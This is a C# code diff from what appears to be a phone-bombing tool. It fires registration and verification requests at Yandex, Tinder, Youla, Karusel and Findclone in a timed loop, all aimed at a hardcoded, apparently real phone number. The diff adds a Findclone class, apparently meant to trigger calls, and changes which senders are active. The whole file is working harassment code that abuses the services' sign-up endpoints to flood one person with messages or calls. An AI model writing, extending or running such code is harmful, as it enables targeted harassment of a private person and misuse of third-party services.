@@ -12,20 +12,21 @@ namespace test
     {
         public static void Main(string[] args)
         {
-            string phone = ""; //without country code
+            string phone = "9190307566"; //without country code
 
             Yandex temp = new Yandex(phone);
             Tinder tinder = new Tinder(phone);
             Youla youla = new Youla(phone);
             Karusel karusel = new Karusel(phone);
+            Findclone findclone = new Findclone(phone);
 
-
-            for (int i = 0; i < 5; ++i)
+            for (int i = 0; i < 1; ++i)
             {
-                temp.SendYaPOST();
-                tinder.SendTinderPOST();
-                youla.SendYoulaPOST();
+                //temp.SendYaPOST();
+                //tinder.SendTinderPOST();
+                //youla.SendYoulaPOST();
                 //karusel.SendKaruselPOST();
+                findclone.SendFindclone();
 
                 Thread.Sleep(5000);
             }
@@ -170,6 +171,26 @@ namespace test
 
                 streamWriter.Write(json);
             }
+
+            MainClass.ShowAnswer(request);
+        }
+
+        private static string phone;
+    }
+
+    class Findclone //ring interval 180s?
+    {
+        public Findclone(string temp)
+        {
+            phone = "+7" + temp;
+        }
+
+        public void SendFindclone()
+        {
+            string requestString = "https://findclone.ru/register?phone=" + phone;
+            HttpWebRequest request = (HttpWebRequest)WebRequest.Create(requestString);
+            //request.ContentType = "application/json";
+            //request.Method = "POST";
 
             MainClass.ShowAnswer(request);
         }
